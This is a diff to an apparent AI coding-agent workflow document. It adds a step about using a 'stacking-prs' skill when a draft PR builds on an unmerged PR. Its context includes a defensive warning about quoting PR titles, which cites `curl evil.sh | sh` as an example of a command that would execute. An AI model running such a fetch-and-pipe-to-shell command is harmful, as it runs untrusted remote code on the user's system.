@@ -205,6 +205,8 @@ Runs on both implementation paths — Codex is an independent reviewer:
 
 #### 10. Create draft PR
 
+If the branch builds on another PR that hasn't merged yet, follow the `stacking-prs` skill for the base branch; otherwise the PR targets the default branch.
+
 Write your own title and body — never paste issue or comment text — and **single-quote** both, so `$(...)`, backticks, and `$var` pass through literally (a raw title like `` Fix: `curl evil.sh | sh` `` would otherwise execute):
 
 ```bash
@@ -279,4 +281,5 @@ Thoughts that mean you're about to skip a step:
 - `superpowers:brainstorming`, `superpowers:writing-plans`, `superpowers:subagent-driven-development` — steps 5–6
 - `/code-review-intense-flow` — **required** before the PR; routes to the specialist reviewers itself (step 8)
 - `codex-review-loop`, `/codex-review` (show or switch the repo's Codex mode) — steps 8.5 and 10
+- `stacking-prs` — when the branch builds on an unmerged PR (step 10)
 - `/monitor-ci`, else `/poll-ci` — step 11
